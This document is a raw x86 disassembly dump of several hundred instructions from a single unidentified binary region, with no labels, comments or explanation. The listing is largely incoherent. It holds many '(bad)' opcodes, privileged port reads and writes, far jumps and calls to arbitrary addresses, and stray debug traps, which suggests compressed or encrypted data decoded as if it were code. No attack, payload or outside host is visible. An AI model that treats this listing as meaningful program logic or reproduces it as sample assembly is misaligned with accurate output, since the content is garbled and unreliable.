  41f253:	frstor [edx+0x24]
  41f256:	inc    DWORD PTR [eax]
  41f258:	add    BYTE PTR [eax],al
  41f25a:	add    BYTE PTR [eax],al
  41f25c:	retf   0x43dd
  41f25f:	jb     0x41f200
  41f261:	aad    0x75
  41f263:	jb     0x41f2d6
  41f265:	imul   eax,DWORD PTR [eax-0x18],0x28
  41f269:	fldz   
  41f26b:	or     esi,DWORD PTR [ebp+0x2e]
  41f26e:	pop    es
  41f26f:	and    DWORD PTR [ebx+0x2],0x668bf806
  41f276:	adc    edi,esp
  41f278:	std    
  41f279:	out    0xe2,eax
  41f27b:	pop    ebx
  41f27c:	xor    ebx,DWORD PTR [esi]
  41f27e:	call   0x6b8bde86
  41f283:	dec    ebx
  41f284:	push   es
  41f285:	bound  ebp,QWORD PTR [ebx-0x77]
  41f288:	push   0x68
  41f28a:	jne    0x41f2fb
  41f28c:	mov    edx,0xa2f77eda
  41f291:	add    ch,BYTE PTR ds:0x4f0269c9
  41f297:	xchg   ebx,eax
  41f298:	imul   eax,DWORD PTR [edx],0xffffffe7
  41f29b:	xchg   DWORD PTR [edx],ecx
  41f29d:	out    dx,eax
  41f29e:	adc    eax,0x6b77a5d7
  41f2a3:	ins    BYTE PTR es:[edi],dx
  41f2a4:	aas    
  41f2a5:	cmp    ax,0x1ad4
  41f2a9:	int3   
  41f2aa:	into   
  41f2ab:	add    esi,DWORD PTR [ebp+0x7e]
  41f2ae:	es clc 
  41f2b0:	push   edi
  41f2b1:	and    esp,0x268e680e
  41f2b7:	dec    eax
  41f2b9:	inc    edx
  41f2ba:	mov    dh,0x80
  41f2bc:	imul   DWORD PTR [edx+0xb]
  41f2bf:	outs   dx,DWORD PTR ds:[esi]
  41f2c0:	add    BYTE PTR [eax],al
  41f2c2:	add    BYTE PTR [eax],al
  41f2c4:	add    BYTE PTR [ecx],al
  41f2c6:	ror    DWORD PTR [esi],cl
  41f2c8:	sbb    eax,0x7bfd65fb
  41f2cd:	aaa    
  41f2ce:	cmc    
  41f2cf:	arpl   WORD PTR [ecx+0x6eed67e2],cx
  41f2d5:	xor    bl,BYTE PTR [edx-0x1e]
  41f2d8:	sbb    dl,bl
  41f2da:	cmp    DWORD PTR gs:[esi+esi*8+0x3a],ebx
  41f2df:	aam    0x6e
  41f2e1:	cld    
  41f2e2:	mov    edi,0xc920cedd
  41f2e7:	scas   eax,DWORD PTR es:[edi]
  41f2e8:	inc    ecx
  41f2e9:	jb     0x41f2ed
  41f2eb:	adc    al,0x7b
  41f2ed:	sahf   
  41f2ee:	cmp    edi,0xffffffc4
  41f2f1:	and    ah,BYTE PTR [esp+edi*8-0x17]
  41f2f5:	enter  0x727a,0xf1
  41f2f9:	icebp  
  41f2fa:	out    0xfe,eax
  41f2fc:	test   DWORD PTR [esi-0x72c1039b],0x21a931fe
  41f306:	loop   0x41f306
  41f308:	call   0xf1719a83
  41f30d:	jbe    0x41f311
  41f30f:	push   ebp
  41f310:	add    esi,DWORD PTR [ecx-0x2d]
  41f313:	cld    
  41f314:	aam    0x36
  41f316:	cmovo  ebp,ecx
  41f319:	fldl2e 
  41f31b:	add    esi,DWORD PTR [edx+0x38]
  41f31e:	cld    
  41f31f:	sub    BYTE PTR ds:0xdd407c4a,0xf5
  41f326:	mov    esi,0x990a
  41f32b:	add    BYTE PTR [eax],al
  41f32d:	add    BYTE PTR [eax+edx*1],bl
  41f330:	pop    ebp
  41f331:	ins    BYTE PTR es:[edi],dx
  41f332:	out    dx,eax
  41f333:	hlt    
  41f334:	mov    BYTE PTR [esi],ch
  41f336:	into   
  41f337:	mov    al,0xae
  41f339:	cs xchg ebx,eax
  41f33b:	jp     0x41f382
  41f33d:	ficomp WORD PTR [ecx+0x38723bc2]
  41f343:	sub    al,BYTE PTR [edi+0x457836aa]
  41f349:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f34a:	fstp   TBYTE PTR es:[ebx]
  41f34d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f34e:	cmc    
  41f34f:	mov    ecx,0x5d3b724b
  41f354:	xchg   edi,eax
  41f355:	cmp    BYTE PTR [ebx+0x66],bl
  41f358:	mov    BYTE PTR [edi+0x13],ah
  41f35b:	gs cld 
  41f35d:	jmp    0xf77e1bbf
  41f362:	mov    dh,0x64
  41f364:	xchg   DWORD PTR [edx+0x3d],ebp
  41f367:	gs cld 
  41f369:	jmp    0xcce80a
  41f36e:	dec    edx
  41f36f:	ret    
  41f370:	cld    
  41f371:	call   FWORD PTR [eax+edx*2-0x22b7c77]
  41f378:	(bad)  
  41f379:	(bad)  
  41f37a:	jl     0x41f353
  41f37c:	rol    DWORD PTR [ebx+0x26801c8],cl
  41f382:	popf   
  41f383:	add    BYTE PTR [eax],al
  41f385:	lea    ebx,[edx]
  41f387:	sar    esp,cl
  41f389:	dec    DWORD PTR [eax+edx*2-0x22b7c77]
  41f390:	(bad)  
  41f391:	inc    DWORD PTR [eax]
  41f393:	add    BYTE PTR [eax],al
  41f395:	add    BYTE PTR [eax],al
  41f397:	mov    ebp,ss
  41f399:	rol    DWORD PTR [ebx+0x4bb0318],cl
  41f39f:	dec    ebp
  41f3a0:	add    BYTE PTR [eax],al
  41f3a2:	or     DWORD PTR [edx+0x5cfffdcb],0x808b894e
  41f3ac:	(bad)  
  41f3ad:	(bad)  
  41f3ae:	call   edi
  41f3b0:	mov    ebp,0xd5bd40e4
  41f3b5:	sti    
  41f3b6:	test   DWORD PTR [ebp+eiz*2-0x7f],ebx
  41f3ba:	push   eax
  41f3bb:	arpl   bp,dx
  41f3bd:	sti    
  41f3be:	push   0xd
  41f3c0:	in     eax,0xb1
  41f3c2:	adc    BYTE PTR [edx-0x2b],dl
  41f3c5:	sti    
  41f3c6:	call   0x3d4ea2
  41f3cb:	xchg   edi,eax
  41f3cc:	mov    esp,0xe43ce84c
  41f3d1:	cld    
  41f3d2:	dec    DWORD PTR [eax+0x351371be]
  41f3d8:	(bad)  
  41f3d9:	std    
  41f3da:	(bad)  
  41f3db:	fsub   st(2),st
  41f3dd:	ret    0xccc6
  41f3e0:	(bad)  
  41f3e1:	aas    
  41f3e2:	dec    ecx
  41f3e3:	cmp    edi,edx
  41f3e5:	in     eax,0x24
  41f3e7:	mov    bl,0xd6
  41f3e9:	sti    
  41f3ea:	push   edi
  41f3eb:	jne    0x41f3cb
  41f3ed:	(bad)
  41f3f0:	(bad)  
  41f3f1:	scas   eax,DWORD PTR es:[edi]
  41f3f2:	div    DWORD PTR [esi+0x59]
  41f3f5:	add    BYTE PTR [edx+0x75],ch
  41f3f8:	fdivr  DWORD PTR [eax]
  41f3fa:	cld    
  41f3fb:	add    BYTE PTR [eax],al
  41f3fd:	add    BYTE PTR [eax],al
  41f3ff:	add    BYTE PTR [ebp-0x5d02ae99],bl
  41f405:	fiadd  WORD PTR [eax+0x7c]
  41f408:	and    dl,0x5a
  41f40b:	(bad)  
  41f40c:	xchg   edx,eax
  41f40d:	pop    ecx
  41f40e:	jge    0x41f392
  41f410:	mov    ebp,DWORD PTR gs:[ebx-0x4]
  41f414:	mov    ebx,0x2c400059
  41f419:	imul   sp,si,0xe369
  41f41e:	imul   edi,esp,0xfffffffe
  41f421:	adc    eax,0x60f6864e
  41f426:	add    al,BYTE PTR [eax]
  41f428:	jne    0x41f479
  41f42a:	clc    
  41f42b:	mov    bh,BYTE PTR [eax-0x9752ed5]
  41f431:	pop    eax
  41f432:	add    al,BYTE PTR [eax]
  41f434:	jne    0x41f3df
  41f436:	imul   edx,DWORD PTR [edx],0x79
  41f439:	inc    ebx
  41f43a:	sar    bh,0xf7
  41f43d:	sbb    al,0xfd
  41f43f:	mov    dh,0x1b
  41f441:	pop    edx
  41f442:	add    BYTE PTR [eax],al
  41f444:	lock fst QWORD PTR [eax]
  41f447:	(bad)  
  41f448:	sbb    bl,BYTE PTR [ebx+eax*2]
  41f44b:	call   DWORD PTR [edx]
  41f44d:	cdq    
  41f44e:	mov    ecx,0xf5e00c72
  41f453:	pop    es
  41f454:	lock fisub DWORD PTR [ebp+0x2]
  41f458:	jne    0x41f4b3
  41f45a:	ror    BYTE PTR [edx+0x24cfe],1
  41f460:	jne    0x41f442
  41f462:	inc    ebx
  41f463:	out    0x0,eax
  41f465:	add    BYTE PTR [eax],al
  41f467:	add    BYTE PTR [eax],al
  41f469:	or     DWORD PTR [ecx],ebp
  41f46b:	ins    BYTE PTR es:[edi],dx
  41f46c:	cld    
  41f46d:	lock add DWORD PTR [edi-0x23620805],esp
  41f474:	imul   ecx,ecx,0x76
  41f477:	ins    BYTE PTR es:[edi],dx
  41f478:	imul   edi,DWORD PTR [ecx+0x2],0x5f57ce7
  41f47f:	out    dx,eax
  41f480:	add    esi,DWORD PTR [ebp-0x4e]
  41f483:	out    0xca,eax
  41f485:	dec    eax
  41f486:	cmp    DWORD PTR [eax-0x58d08b00],ebp
  41f48c:	das    
  41f48d:	(bad)
  41f490:	sti    
  41f491:	leave  
  41f492:	test   DWORD PTR [edi+ebp*1],0xd208edbd
  41f499:	inc    ebp
  41f49a:	ins    BYTE PTR es:[edi],dx
  41f49b:	imul   ebp,DWORD PTR [ebp+0x4a],0x29fad9ed
  41f4a2:	int    0xe8
  41f4a4:	xchg   BYTE PTR [ebx-0x25],ah
  41f4a7:	cli    
  41f4a8:	add    ah,dh
  41f4aa:	pop    ebx
  41f4ab:	push   cs
  41f4ac:	icebp  
  41f4ad:	ja     0x41f49b
  41f4af:	jmp    0x1fa:0xb93275cb
  41f4b6:	or     eax,0xe932cd64
  41f4bb:	imul   ebp,DWORD PTR [edi+0x73],0x2b06eed9
  41f4c2:	nop
  41f4c3:	mov    dl,0x74
  41f4c5:	cmp    ch,BYTE PTR [esi+0x6]
  41f4c8:	jns    0x41f495
  41f4ca:	mov    eax,ds:0x86c4
  41f4cf:	add    BYTE PTR [eax],al
  41f4d1:	add    BYTE PTR ds:0x75fb9e08,bl
  41f4d7:	pop    eax
  41f4d8:	imul   esi,eax,0x1b
  41f4db:	dec    esp
  41f4dc:	add    ebx,edi
  41f4de:	out    dx,eax
  41f4df:	mov    ebx,0x5df5e26d
  41f4e4:	jmp    0x41f4d8
  41f4e6:	jge    0x41f4ed
  41f4e8:	cmc    
  41f4e9:	js     0x41f551
  41f4eb:	push   ebx
  41f4ec:	(bad)  
  41f4ed:	aas    
  41f4ee:	cli    
  41f4ef:	inc    ebx
  41f4f0:	add    DWORD PTR [edx],eax
  41f4f2:	ss mov edx,0xd5916c65
  41f4f8:	add    BYTE PTR [edx-0x72],ch
  41f4fb:	pusha  
  41f4fc:	xchg   DWORD PTR [esi],ebx
  41f4fe:	scas   eax,DWORD PTR es:[edi]
  41f4ff:	inc    edx
  41f500:	imul   esp,ecx,0xaa580639
  41f506:	lds    ecx,FWORD PTR [edx-0x7338e715]
  41f50c:	inc    edx
  41f50d:	loope  0x41f4d5
  41f50f:	jmp    0x41f518
  41f511:	scas   al,BYTE PTR es:[edi]
  41f512:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f513:	or     DWORD PTR [ecx],esi
  41f515:	lahf   
  41f516:	pop    ds
  41f517:	hlt    
  41f518:	das    
  41f519:	stc    
  41f51a:	mov    dh,0x61
  41f51c:	sub    DWORD PTR [ecx+0x14fd1c92],0x79
  41f523:	imul   esi,DWORD PTR [edi-0x76fd891e],0x7356f579
  41f52d:	iret   
  41f52e:	sti    
  41f52f:	fisttp DWORD PTR [ebx]
  41f531:	jmp    0xacccf680
  41f536:	add    BYTE PTR [eax],al
  41f538:	add    BYTE PTR [eax],al
  41f53a:	add    dl,bl
  41f53c:	shr    DWORD PTR [ecx-0x1b],1
  41f53f:	(bad)  
  41f541:	or     eax,ebx
  41f543:	dec    edx
  41f544:	pop    esi
  41f545:	jb     0x41f528
  41f547:	iret   
  41f548:	hlt    
  41f549:	aas    
  41f54a:	fnstenv [esi]
  41f54c:	popa   
  41f54d:	sub    DWORD PTR [ecx],0x25
  41f550:	or     DWORD PTR [esi+0x41],edx
  41f553:	imul   ecx,DWORD PTR [eax-0x3],0xfc58632e
  41f55a:	pushf  
  41f55b:	push   cs
  41f55c:	pop    esi
  41f55d:	adc    ch,ch
  41f55f:	arpl   dx,ax
  41f561:	jmp    DWORD PTR [ecx-0x4c]
  41f564:	mov    edi,0x60fe2bc6
  41f569:	push   ebx
  41f56a:	add    BYTE PTR [edi-0x47],ah
  41f56d:	jg     0x41f55b
  41f56f:	enter  0x5332,0x33
  41f573:	jmp    0x41f5a7
  41f575:	data16 add al,0xcb
  41f578:	adc    BYTE PTR [eax-0x78f963ee],ch
  41f57e:	lock pop edi
  41f580:	push   ds
  41f581:	cld    
  41f582:	cmp    ebx,DWORD PTR [ecx+edx*2-0x1d6e72cf]
  41f589:	dec    esp
  41f58a:	push   esi
  41f58b:	jecxz  0x41f52d
  41f58d:	loopne 0x41f5ab
  41f58f:	pushf  
  41f590:	add    al,0x0
  41f592:	inc    ecx
  41f594:	push   eax
  41f595:	or     eax,0x10bd8c40
  41f59a:	mov    esp,DWORD PTR [ecx-0x2a]
  41f59d:	aaa    
  41f59e:	inc    ebp
  41f59f:	add    BYTE PTR [eax],al
  41f5a1:	add    BYTE PTR [eax],al
  41f5a3:	add    BYTE PTR [edi+ebp*2-0x5ee6b903],al
  41f5aa:	loopne 0x41f5fc
  41f5ac:	inc    edx
  41f5ad:	jmp    0x41f5c0
  41f5af:	pop    esp
  41f5b0:	dec    ebp
  41f5b1:	inc    esp
  41f5b2:	cld    
  41f5b3:	test   BYTE PTR [eax+esi*2],bl
  41f5b6:	in     al,0x56
  41f5b8:	jmp    0x41f5c9
  41f5ba:	or     al,0x13
  41f5bc:	mov    WORD PTR [esi],es
  41f5be:	xchg   edi,eax
  41f5c0:	cmp    ecx,DWORD PTR [edx-0x3b]
  41f5c3:	ret    0x450
  41f5c6:	push   ecx
  41f5c7:	mov    edi,DWORD PTR [eax-0xe7177b]
  41f5cd:	fadd   DWORD PTR [ecx-0x8]
  41f5d0:	or     al,0x17
  41f5d2:	xlat   BYTE PTR ds:[ebx]
  41f5d3:	push   ebx
  41f5d4:	inc    esi
  41f5d5:	and    al,0xfb
  41f5d7:	adc    eax,0x3ff630
  41f5dc:	cld    
  41f5dd:	jmp    0x84fc:0x440c3811
  41f5e4:	pop    esp
  41f5e5:	outs   dx,DWORD PTR ds:[esi]
  41f5e6:	adc    cl,BYTE PTR [ebp+0x4f68ae75]
  41f5ec:	(bad)
  41f5f0:	repnz xor BYTE PTR ds:[eax],dl
  41f5f4:	xor    eax,0x68bf7d69
  41f5f9:	ins    DWORD PTR es:[edi],dx
  41f5fa:	xor    al,al
  41f5fc:	into   
  41f5fd:	jge    0x41f674
  41f5ff:	inc    edx
  41f600:	loope  0x41f61b
  41f602:	addr16 jb 0x41f682
  41f605:	test   al,0xbd
  41f607:	out    0x0,eax
  41f609:	add    BYTE PTR [eax],al
  41f60b:	add    BYTE PTR [eax],al
  41f60d:	je     0x41f678
  41f60f:	add    BYTE PTR [eax],al
  41f611:	es test al,0xbd
  41f614:	repz ja 0x41f680
  41f617:	add    BYTE PTR [eax],al
  41f619:	stos   BYTE PTR es:[edi],al
  41f61a:	ss mov eax,0x7d69350f
  41f620:	mov    edi,0x50d30a21
  41f625:	es (bad) 
  41f627:	mov    ebp,0x671c25e7
  41f62c:	jb     0x41f6ab
  41f62e:	js     0x41f63d
  41f630:	dec    esp
  41f631:	sub    DWORD PTR gs:[ebx+eax*4],eax
  41f635:	xor    eax,0x80fcf45d
  41f63a:	imul   edx,DWORD PTR [ebx],0x40ee7540
  41f640:	jb     0x41f6b9
  41f642:	sbb    al,0x2
  41f644:	std    
  41f645:	enter  0x67e1,0x12
  41f649:	jns    0x41f6a7
  41f64b:	sar    bh,0xec
  41f64e:	sub    ecx,esp
  41f650:	(bad)  
  41f651:	aaa    
  41f652:	add    BYTE PTR gs:[ebx-0x2],dl
  41f656:	mov    ah,0xd1
  41f658:	dec    esi
  41f659:	(bad)  
  41f65a:	out    dx,al
  41f65b:	mov    ebp,0xf843c5f7
  41f660:	imul   ebx,DWORD PTR [edx],0x68fc4b5c
  41f666:	add    dl,bh
  41f668:	adc    esi,DWORD PTR [ebp+0x71436402]
  41f66e:	xchg   BYTE PTR [edx+0x3],bh
  41f671:	add    BYTE PTR [eax],al
  41f673:	add    BYTE PTR [eax],al
  41f675:	add    BYTE PTR [ebp+0x2],dh
  41f678:	mov    dh,0x7c
  41f67a:	scas   eax,DWORD PTR es:[edi]
  41f67b:	ret    0xc3d6
  41f67e:	jmp    0x99b3:0x3267a38d
  41f685:	fld    QWORD PTR [ebx-0x2e948ca1]
  41f68b:	imul   eax,DWORD PTR ss:[edi+eax*2-0x2c],0xffffffdd
  41f691:	adc    DWORD PTR [ebp-0xd],esi
  41f694:	es add al,0xf4
  41f697:	pop    ecx
  41f698:	push   eax
  41f699:	icebp  
  41f69a:	sbb    DWORD PTR [ebx+0x436d682b],ecx
  41f6a0:	xor    ah,ah
  41f6a2:	dec    eax
  41f6a3:	push   0x75
  41f6a5:	inc    eax
  41f6a6:	cwde   
  41f6a7:	pop    esi
  41f6a8:	popa   
  41f6a9:	je     0x41f6f8
  41f6ab:	push   ebx
  41f6ac:	sbb    dl,bl
  41f6ae:	inc    esp
  41f6b0:	call   0xcce:0x92d481d4
  41f6b7:	stc    
  41f6b8:	(bad)  
  41f6b9:	icebp  
  41f6ba:	push   0x5e
  41f6bc:	popf   
  41f6bd:	sub    DWORD PTR [edx],0xa866c0d7
  41f6c3:	pop    ebp
  41f6c4:	(bad)  [edi]
  41f6c6:	test   edx,eax
  41f6c8:	out    0x2a,al
  41f6ca:	xor    al,0xd7
  41f6cc:	adc    al,0x7a
  41f6ce:	dec    edx
  41f6cf:	sbb    al,0x2a
  41f6d1:	out    dx,al
  41f6d2:	call   0x4db2:0xb2449d0d
  41f6d9:	add    BYTE PTR cs:[eax],al
  41f6dc:	add    BYTE PTR [eax],al
  41f6de:	add    BYTE PTR [eax],dh
  41f6e0:	clc    
  41f6e1:	cli    
  41f6e2:	adc    esi,DWORD PTR [ebp-0x59bcfdfe]
  41f6e8:	cmc    
  41f6e9:	jmp    DWORD PTR [ecx+0x71]
  41f6ec:	sbb    DWORD PTR [eax],eax
  41f6ee:	or     DWORD PTR [ecx+0x2],edi
  41f6f1:	jno    0x41f6e0
  41f6f3:	(bad)  
  41f6f4:	pop    esp
  41f6f5:	jmp    0x304444ed
  41f6fa:	jmp    0x6a1aef75
  41f6ff:	add    dl,BYTE PTR ss:[esi+0x11]
  41f703:	clc    
  41f704:	inc    ecx
  41f705:	std    
  41f706:	(bad)  
  41f707:	mov    eax,0x53f1725e
  41f70c:	lock or ebx,edx
  41f70f:	mov    dh,0x5d
  41f711:	pop    ebp
  41f712:	jae    0x41f74b
  41f714:	mov    edx,0x8aa5aac6
  41f719:	jmp    0x41f753
  41f71b:	mul    al
  41f71d:	sti    
  41f71e:	jmp    0x29b670f1
  41f723:	jno    0x41f784
  41f725:	adc    ah,BYTE PTR [ebp+0x6bffc284]
  41f72b:	rcr    DWORD PTR ss:[edi],1
  41f72e:	inc    ecx
  41f72f:	or     esi,edx
  41f731:	aas    
  41f732:	jmp    0xa95455dd
  41f737:	fs ret 0x6bff
  41f73b:	ror    DWORD PTR ss:[edi],1
  41f73e:	pop    esp
  41f73f:	sub    eax,0x134e59
  41f744:	add    BYTE PTR [eax],al
  41f746:	add    BYTE PTR [eax],al
  41f748:	rcr    BYTE PTR [esi-0x31],cl
  41f74b:	fs mov dh,0xd0
  41f74e:	add    edi,DWORD PTR [ebx+0x6ac044b6]
  41f754:	pop    ebp
  41f755:	pop    ecx
  41f756:	push   ebp
  41f758:	in     eax,0x9c
  41f75a:	(bad)  
  41f75b:	sub    ah,BYTE PTR ds:0xa26aeb8a
  41f761:	mov    ch,0x55
  41f763:	sbb    dh,BYTE PTR [eax+0x12]
  41f766:	test   BYTE PTR [eax],0x3a
  41f769:	fimul  WORD PTR [ecx-0x4]
  41f76c:	ja     0x41f78a
  41f76e:	jb     0x41f78a
  41f770:	ss popf 
  41f772:	mov    DWORD PTR [ebp-0xc],eax
  41f775:	dec    esi
  41f776:	dec    esp
  41f777:	dec    DWORD PTR [ecx]
  41f779:	inc    ecx
  41f77a:	adc    al,BYTE PTR [eax+0xc]
  41f77d:	add    al,0xc
  41f780:	dec    ebx
  41f781:	inc    edx
  41f782:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f783:	inc    esp
  41f784:	fadd   QWORD PTR [eax]
  41f786:	add    BYTE PTR [ebp+0x4d897919],cl
  41f78c:	loopne 0x41f7b6
  41f78e:	jno    0x41f798
  41f790:	pop    eax
  41f791:	add    BYTE PTR [edi+0x51d9d44d],al
  41f797:	in     al,dx
  41f798:	mov    ?,WORD PTR [esi]
  41f79a:	sti    
  41f79b:	jne    0x41f76d
  41f79d:	dec    esi
  41f79e:	fs add ah,cl
  41f7a1:	add    BYTE PTR [esi+edx*2],al
  41f7a4:	push   0x4c
  41f7a6:	dec    ebp
  41f7a7:	push   esi
  41f7a8:	mov    bl,0xc
  41f7aa:	dec    esp
  41f7ab:	adc    DWORD PTR [eax],eax
  41f7ad:	add    BYTE PTR [eax],al
  41f7af:	add    BYTE PTR [eax],al
  41f7b1:	dec    esp
  41f7b2:	push   es
  41f7b3:	add    eax,0x7534f858
  41f7b9:	lods   al,BYTE PTR ds:[esi]
  41f7ba:	ins    BYTE PTR es:[edi],dx
  41f7bb:	or     al,0x6a
  41f7bd:	mov    ebx,ss
  41f7bf:	inc    ecx
  41f7c0:	in     al,dx
  41f7c1:	cmp    al,0xe7
  41f7c3:	jno    0x41f7d5
  41f7c5:	hlt    
  41f7c6:	add    al,0xc4
  41f7c8:	inc    BYTE PTR [ebx]
  41f7ca:	mov    edx,0xd069ff0c
  41f7cf:	xchg   DWORD PTR ds:0x3ff350,esi
  41f7d5:	jecxz  0x41f7a3
  41f7d7:	sti    
  41f7d8:	jne    0x41f7aa
  41f7da:	in     eax,0xd2
  41f7dc:	mov    ebx,DWORD PTR [ecx]
  41f7de:	in     al,dx
  41f7df:	out    0x2,eax
  41f7e1:	pop    edi
  41f7e2:	(bad)  
  41f7e3:	pop    edx
  41f7e4:	leave  
  41f7e5:	jne    0x41f80e
  41f7e7:	clc    
  41f7e8:	dec    ecx
  41f7ea:	loopne 0x41f843
  41f7ec:	push   ebp
  41f7ed:	sbb    si,WORD PTR [ebp+0x42]
  41f7f1:	jno    0x41f7f5
  41f7f3:	in     eax,dx
  41f7f4:	or     esp,DWORD PTR [eax+0x7d726338]
  41f7fa:	inc    ecx
  41f7fb:	add    BYTE PTR [eax-0x4b],bh
  41f7fe:	imul   edx,eax,0x6614f9e7
  41f804:	cld    
  41f805:	imul   BYTE PTR ds:0xc89e8f8
  41f80b:	in     eax,dx
  41f80c:	or     ebp,edx
  41f80e:	fdivp  st(0),st
  41f810:	addr16 jno 0x41f794
  41f813:	sar    bh,0x0
  41f816:	add    BYTE PTR [eax],al
  41f818:	add    BYTE PTR [eax],al
  41f81a:	sub    al,BYTE PTR [ecx]
  41f81c:	(bad)  
  41f81d:	aam    0xd3
  41f81f:	ins    BYTE PTR es:[edi],dx
  41f820:	jg     0x41f7e5
  41f822:	and    BYTE PTR gs:[esi],bh
  41f825:	jge    0x41f885
  41f827:	cmp    al,0xed
  41f829:	pop    ss
  41f82a:	out    dx,al
  41f82b:	cs adc ch,bh
  41f82e:	sub    BYTE PTR [ecx+0x63],bl
  41f831:	jb     0x41f8ac
  41f833:	xor    DWORD PTR [eax],esi
  41f835:	std    
  41f836:	mov    ds:0x6972639c,al
  41f83b:	loopne 0x41f8ad
  41f83d:	out    0x22,eax
  41f83f:	test   al,0x62
  41f841:	cld    
  41f842:	(bad)  
  41f843:	stos   DWORD PTR es:[edi],eax
  41f844:	ret    0xb75a
  41f847:	push   ebp
  41f848:	add    BYTE PTR [ebx-0x12],dl
  41f84b:	test   DWORD PTR [edi-0x15],edi
  41f84e:	fst    QWORD PTR [edi+ebp*1]
  41f851:	std    
  41f852:	frstor [ebp-0x18]
  41f855:	aas    
  41f856:	jne    0x41f82a
  41f858:	in     eax,0xef
  41f85a:	pop    edx
  41f85b:	rcl    BYTE PTR ds:[ecx],1
  41f85e:	mov    ch,0x69
  41f860:	jns    0x41f8a4
  41f862:	inc    ecx
  41f863:	add    ah,BYTE PTR [edx]
  41f865:	cmp    eax,0x3238671
  41f86a:	jne    0x41f86e
  41f86c:	mov    edx,0x2714fdcd
  41f871:	adc    DWORD PTR [ebp-0x62e430fe],esi
  41f877:	ret    0xd3e6
  41f87a:	sbb    DWORD PTR [esi+edi*4],esi
  41f87d:	ret    
  41f87e:	add    BYTE PTR [eax],al
  41f880:	add    BYTE PTR [eax],al
  41f882:	add    BYTE PTR [edx-0x789b193e],cl
  41f888:	push   esi
  41f889:	jno    0x41f8d6
  41f88b:	add    DWORD PTR [edi+ebp*2],esi
  41f88e:	mov    esi,0xf436170e
  41f893:	imul   BYTE PTR [esi-0x1a]
  41f896:	add    esi,DWORD PTR [ebp+0x17]
  41f899:	cs hlt 
  41f89b:	test   BYTE PTR [esi-0x4c8afc1a],0xf5
  41f8a2:	in     eax,dx
  41f8a3:	jp     0x41f832
  41f8a5:	mov    ds:0x63893a6b,eax
  41f8aa:	pop    esp
  41f8ab:	shr    DWORD PTR [esi],0x63
  41f8ae:	inc    esp
  41f8af:	inc    edi
  41f8b0:	call   FWORD PTR [edi-0x1f]
  41f8b3:	stos   BYTE PTR es:[edi],al
  41f8b4:	out    0x22,eax
  41f8b6:	ret    0x4265
  41f8b9:	sbb    al,0xea
  41f8bb:	sti    
  41f8bc:	les    edi,FWORD PTR [edx+0x1d7a3791]
  41f8c2:	mov    ah,0x91
  41f8c4:	hlt    
  41f8c5:	es cli 
  41f8c7:	dec    edx
  41f8c8:	add    dh,BYTE PTR [edx-0x2f]
  41f8cb:	outs   dx,BYTE PTR ds:[esi]
  41f8cc:	jg     0x41f870
  41f8ce:	adc    dl,dh
  41f8d0:	aam    0x6e
  41f8d2:	(bad)  
  41f8d3:	out    dx,eax
  41f8d4:	mov    ds:0x5e752d1,al
  41f8d9:	je     0x41f8ac
  41f8db:	pop    esi
  41f8dc:	mov    BYTE PTR [ebx],ah
  41f8de:	inc    eax
  41f8df:	stos   BYTE PTR es:[edi],al
  41f8e0:	xchg   edi,edi
  41f8e2:	sub    edx,ecx
  41f8e4:	leave  
  41f8e5:	mov    BYTE PTR [eax+eax*1],ah
  41f8e8:	add    BYTE PTR [eax],al
  41f8ea:	add    BYTE PTR [eax],al
  41f8ec:	test   eax,0x815e4fae
  41f8f1:	cli    
  41f8f2:	mov    edi,0xfffe7104
  41f8f7:	call   0xe941fb81
  41f8fc:	jb     0x41f8b0
  41f8fe:	push   esp
  41f8ff:	sahf   
  41f900:	(bad)  
  41f902:	push   esp
  41f903:	ds cmp al,0x2
  41f906:	std    
  41f907:	fdivr  QWORD PTR [edx]
  41f909:	or     al,BYTE PTR [eax-0x17]
  41f90c:	std    
  41f90d:	cdq    
  41f90e:	jae    0x41f90f
  41f910:	xchg   edi,eax
  41f911:	aam    0xdf
  41f913:	jb     0x41f971
  41f915:	push   es
  41f916:	adc    DWORD PTR [ecx+0xed55776],ebp
  41f91c:	int3   
  41f91d:	cmp    eax,0xc4f21ffc
  41f922:	jecxz  0x41f994
  41f924:	lods   al,BYTE PTR ds:[esi]
  41f925:	imul   esi,DWORD PTR [esi],0x5d52e74
  41f92b:	out    dx,al
  41f92c:	lods   eax,DWORD PTR ds:[esi]
  41f92d:	push   ecx
  41f92e:	cld    
  41f92f:	cmp    al,0x45
  41f931:	push   esi
  41f932:	jb     0x41f909
  41f934:	push   edi
  41f935:	hlt    
  41f936:	pop    ebx
  41f937:	sti    
  41f938:	mov    dh,0x59
  41f93a:	pop    edx
  41f93b:	xor    bh,dl
  41f93d:	(bad)  
  41f93e:	out    dx,eax
  41f93f:	xor    BYTE PTR es:[ebx+0x7],al
  41f943:	jmp    0x1e45b933
  41f948:	add    bl,BYTE PTR ds:0x59b6da0c
  41f94e:	sub    DWORD PTR [ecx+0x0],0x0
  41f955:	stos   BYTE PTR es:[edi],al
  41f956:	add    dl,BYTE PTR [eax-0x62]
  41f959:	aas    
  41f95a:	mov    al,BYTE PTR ds:0xd5b66c
  41f960:	cmp    esi,edx
  41f962:	imul   eax,DWORD PTR cs:[eax],0x4ce49b3c
  41f969:	pavgw  mm7,mm3
  41f96c:	pop    edi
  41f96d:	pop    ds
  41f96e:	call   0x500c:0x4aa9ec87
  41f975:	es add eax,0xe43c75fb
  41f97b:	jno    0x41f989
  41f97d:	retf   
  41f97e:	cmp    al,BYTE PTR [edx+ebp*2]
  41f981:	sbb    al,0xe4
  41f983:	adc    eax,esi
  41f985:	ds inc ebp
  41f987:	cld    
  41f988:	test   BYTE PTR [ecx+esi*1+0x8],cl
  41f98c:	push   eax
  41f98d:	dec    ebx
  41f98e:	pop    edx
  41f98f:	or     BYTE PTR [ebx],dl
  41f991:	fadd   QWORD PTR [edi+eax*4]
  41f994:	inc    ebp
  41f995:	cld    
  41f996:	out    0xfe,eax
  41f998:	xor    cl,BYTE PTR [edx+eax*2-0x42]
  41f99c:	or     al,0xdc
  41f99e:	cdq    
  41f99f:	xchg   esp,ebp
  41f9a1:	pop    ebp
  41f9a2:	jmp    0x50dfd13
  41f9a7:	push   esi
  41f9a8:	push   edi
  41f9a9:	dec    ecx
  41f9aa:	mov    bh,al
  41f9ac:	dec    bl
  41f9ae:	loop   0x41f9fc
  41f9b0:	inc    DWORD PTR [ecx+0xd]
  41f9b3:	sti    
